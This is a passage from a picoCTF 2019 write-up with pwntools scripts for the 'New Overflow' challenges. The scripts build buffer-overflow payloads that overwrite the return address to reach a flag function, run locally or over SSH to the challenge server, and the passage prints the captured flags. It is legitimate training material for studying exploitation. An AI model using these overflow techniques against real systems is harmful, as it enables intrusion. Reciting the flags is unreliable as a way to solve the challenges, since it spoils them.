# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

padding = cyclic(cyclic_find('saaa'))          # location of pattern match @ rsp
rop = p64(0x004008c4)
flag = p64(0x00400767)                         # address of flag function

payload = padding
payload += rop
payload += flag

io.sendline(payload)

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}*

[Return to Top](#picoctf19)
***

##  New Overvflow 2<a name="newoverflow2"></a>

> ### Problem
>> Now try overwriting arguments. Can you get the flag from this program? You can find it 
>> in /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server. 
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Source/newoverflow2.md#newoverflow2source1)

> ### Solution
>> The writer of this problem left the flag function in there, so instead of using a ROP chain to supply the correct arguments,
>> you can just use the same script as the [New Overflow](#newoverflow) problem.
~~~python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

padding = cyclic(72)          # location of pattern match @ rsp
win = p64(0x004009bc)         # location of main function
flag = p64(0x0040084d)        # location of flag function

payload = padding
payload += win
payload += flag

io.sendline(payload)

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################
~~~

**Flag:** *picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}*

[Return to Top](#picoctf19)
***
